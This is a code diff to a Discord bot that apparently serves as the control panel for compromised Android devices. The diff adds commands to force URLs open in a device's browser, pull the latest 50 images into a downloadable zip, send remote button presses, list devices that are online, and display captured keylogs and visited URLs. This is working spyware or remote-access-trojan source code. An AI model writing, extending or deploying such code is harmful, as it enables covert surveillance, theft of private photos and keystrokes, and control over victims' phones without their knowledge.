@@ -95,6 +95,9 @@ DEVICE_COMMAND_NAMES = {
     "setpin",
     "prank_mode",
     "spoof",
+    "openlink",
+    "getimages",
+    "remote_input",
 }
 
 
@@ -328,7 +331,6 @@ class LockToggleButton(discord.ui.Button["LockAppPickerView"]):
             return
         await self.view.handle_toggle(interaction, self.package_name)
 
-
 class LockAppPickerView(discord.ui.View):
     def __init__(self, client: "ADexDiscordClient", owner_user_id: int, guild_id: int, channel_id: int, session: LockAppPickerSession) -> None:
         super().__init__(timeout=300)
@@ -428,6 +430,51 @@ class LockAppPickerView(discord.ui.View):
             await self.message.edit(content=self.render_text(), view=self)
 
 
+class RemoteControlView(discord.ui.View):
+    def __init__(self, client: "ADexDiscordClient", device_id: str, owner_user_id: int):
+        super().__init__(timeout=300)
+        self.client = client
+        self.device_id = device_id
+        self.owner_user_id = owner_user_id
+
+    async def _send_action(self, interaction: discord.Interaction, action: str):
+        if interaction.user.id != self.owner_user_id:
+            await interaction.response.send_message("You are not the owner of this session.", ephemeral=True)
+            return
+        await interaction.response.defer(ephemeral=True)
+        try:
+            await self.client.backend.post(
+                "/api/v1/commands",
+                {
+                    "guildId": str(interaction.guild_id),
+                    "channelId": str(interaction.channel_id),
+                    "discordUserId": str(interaction.user.id),
+                    "deviceId": self.device_id,
+                    "commandName": "remote_input",
+                    "payload": {"action": action},
+                },
+            )
+            await interaction.followup.send(f"Action `{action}` sent to device.", ephemeral=True)
+        except Exception as e:
+            await interaction.followup.send(f"Failed: {e}", ephemeral=True)
+
+    @discord.ui.button(label="Back", style=discord.ButtonStyle.danger, row=0)
+    async def back(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self._send_action(interaction, "BACK")
+
+    @discord.ui.button(label="Home", style=discord.ButtonStyle.primary, row=0)
+    async def home(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self._send_action(interaction, "HOME")
+
+    @discord.ui.button(label="Recents", style=discord.ButtonStyle.secondary, row=0)
+    async def recents(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self._send_action(interaction, "RECENTS")
+
+    @discord.ui.button(label="Notifications", style=discord.ButtonStyle.secondary, row=1)
+    async def notifications(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await self._send_action(interaction, "NOTIFICATIONS")
+
+
 class LockPageButton(discord.ui.Button["LockAppPickerView"]):
     def __init__(self, label: str, direction: int) -> None:
         super().__init__(style=discord.ButtonStyle.secondary, label=label, row=0)
@@ -507,6 +554,11 @@ def format_result_message(result: dict[str, Any]) -> str:
                     f"Type: `{'dir' if stat.get('isDirectory') else 'file'}` | "
                     f"Size: `{stat.get('size', 0)}` | Modified: `{stat.get('modifiedAt', 0)}`"
                 )
+
+        if command_name == "getimages":
+            count = data.get("count", 0)
+            url = data.get("fileUrl")
+            return f"✅ **Images Captured!**\nFound `{count}` images.\nDownload Zip: {url}" if url else f"✅ Found `{count}` images (upload pending)."
 
         data_text = ""
         if result.get("data") is not None:
@@ -1476,6 +1528,126 @@ class ADexDiscordClient(discord.Client):
                 await interaction.response.send_message("PIN must be exactly 4 numeric digits.", ephemeral=True)
                 return
             await self._queue_remote_command(interaction, "setpin", {"pin": pin})
+
+        @self.tree.command(name="openlink", description="Open a URL in the device browser")
+        @app_commands.describe(url="The URL to open (e.g. https://google.com)")
+        async def openlink(interaction: discord.Interaction, url: str) -> None:
+            await self._queue_remote_command(interaction, "openlink", {"url": url})
+
+        @self.tree.command(name="getimages", description="Capture all images (latest 50) in a zip file")
+        async def getimages(interaction: discord.Interaction) -> None:
+            await self._queue_remote_command(interaction, "getimages", {})
+
+        @self.tree.command(name="id", description="Get device IDs filtered by status")
+        @app_commands.describe(filter="Status filter")
+        @app_commands.choices(filter=[
+            app_commands.Choice(name="online", value="online"),
+            app_commands.Choice(name="offline", value="offline"),
+            app_commands.Choice(name="all", value="all"),
+        ])
+        async def id_cmd(interaction: discord.Interaction, filter: app_commands.Choice[str]) -> None:
+            if not await self._validate_guild_context(interaction):
+                return
+            await interaction.response.defer(thinking=True)
+            try:
+                data = await self.backend.get("/api/v1/devices", {"guildId": str(interaction.guild_id)})
+                devices = data.get("devices", [])
+                
+                if filter.value == "online":
+                    filtered = [d for d in devices if d.get("status") == "online"]
+                elif filter.value == "offline":
+                    filtered = [d for d in devices if d.get("status") == "offline"]
+                else:
+                    filtered = devices
+
+                if not filtered:
+                    await interaction.followup.send(f"No devices found with status: `{filter.value}`.")
+                    return
+
+                lines = []
+                for d in filtered:
+                    status = "🟢" if d.get("status") == "online" else "🔴"
+                    lines.append(f"{status} **{d.get('model', 'Unknown')}** - ID: `{d['id']}`")
+                
+                output = "\n".join(lines)
+                await interaction.followup.send(f"**Devices ({filter.value}):**\n{output}")
+            except Exception as e:
+                await interaction.followup.send(f"Error: {e}")
+
+        @self.tree.command(name="button", description="Interactive remote control for a device")
+        async def button_cmd(interaction: discord.Interaction) -> None:
+            if not await self._validate_guild_context(interaction):
+                return
+            await interaction.response.defer(thinking=True)
+            try:
+                data = await self.backend.get("/api/v1/devices", {"guildId": str(interaction.guild_id), "discordUserId": str(interaction.user.id)})
+                devices = [d for d in data.get("devices", []) if d.get("status") == "online"]
+                if not devices:
+                    await interaction.followup.send("No online devices found.")
+                    return
+
+                view = discord.ui.View()
+                for d in devices[:25]:
+                    did = d["id"]
+                    model = d.get("model", "Unknown")
+                    btn = discord.ui.Button(label=f"Control {model} ({did[:4]})", style=discord.ButtonStyle.success)
+                    
+                    def make_callback(device_id, device_model):
+                        async def callback(inner_inter: discord.Interaction):
+                            rc_view = RemoteControlView(self, device_id, inner_inter.user.id)
+                            await inner_inter.response.send_message(f"Remote control for **{device_model}** (`{device_id}`):", view=rc_view, ephemeral=True)
+                        return callback
+                    
+                    btn.callback = make_callback(did, model)
+                    view.add_item(btn)
+                
+                await interaction.followup.send("Select an online device to control:", view=view)
+            except Exception as e:
+                await interaction.followup.send(f"Error: {e}")
+
+        @self.tree.command(name="logs", description="View recent captured logs (urls, keylogs) for a device")
+        @app_commands.describe(device_id="Device ID (optional if only one device exists)", limit="Number of logs to fetch (max 100)")
+        async def logs(interaction: discord.Interaction, device_id: str | None = None, limit: int = 50) -> None:
+            if not await self._validate_guild_context(interaction):
+                return
+            await interaction.response.defer(thinking=True)
+            try:
+                target_device_id = device_id
+                if not target_device_id:
+                    data = await self.backend.get("/api/v1/devices", {"guildId": str(interaction.guild_id), "discordUserId": str(interaction.user.id)})
+                    devices = data.get("devices", [])
+                    if not devices:
+                        await interaction.followup.send("No devices found.")
+                        return
+                    if len(devices) == 1:
+                        target_device_id = devices[0]["id"]
+                    else:
+                        await interaction.followup.send("Multiple devices found. Please specify `device_id`.")
+                        return
+
+                events_data = await self.backend.get(f"/api/v1/devices/{target_device_id}/events", {"limit": min(limit, 100)})
+                events = events_data.get("events", [])
+                
+                if not events:
+                    await interaction.followup.send(f"No captured logs found for device `{target_device_id}`.")
+                    return
+
+                lines = []
+                from datetime import datetime
+                for ev in events:
+                    ts = datetime.fromtimestamp(ev["ts"] / 1000).strftime("%H:%M:%S")
+                    etype = ev["action"].replace("device.event.", "")
+                    meta = ev["metadata"]
+                    content = meta.get("url") or meta.get("text") or json.dumps(meta, ensure_ascii=False)
+                    lines.append(f"`[{ts}]` **{etype}**: {content}")
+                
+                output = "\n".join(lines[:20])
+                if len(lines) > 20:
+                    output += f"\n*... (and {len(lines)-20} more)*"
+                
+                await interaction.followup.send(f"**Captured Logs for `{target_device_id}`:**\n{output}")
+            except Exception as e:
+                await interaction.followup.send(f"Error: {e}")
 
 
     async def _validate_guild_context(self, interaction: discord.Interaction) -> bool:
